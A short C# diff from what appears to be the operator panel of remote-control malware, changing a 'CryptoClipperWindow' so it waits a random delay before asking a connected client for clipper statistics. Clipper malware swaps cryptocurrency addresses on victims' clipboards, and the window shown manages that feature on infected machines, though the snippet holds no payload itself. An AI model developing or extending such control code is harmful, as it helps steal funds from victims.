@@ -28,9 +28,12 @@ public partial class CryptoClipperWindow : Window
             _server.UnregisterHandler(clientId, PacketType.ClipperDetected);
         };
 
-        // Request current stats on open
+        // Request current stats on open (staggered)
         Loaded += async (_, _) =>
+        {
+            await Task.Delay(Random.Shared.Next(0, 250));
             await _server.SendToClient(_clientId, new Packet { Type = PacketType.ClipperGetStats });
+        };
     }
 
     // ── Incoming ────────────────────────────────────────────────────────────
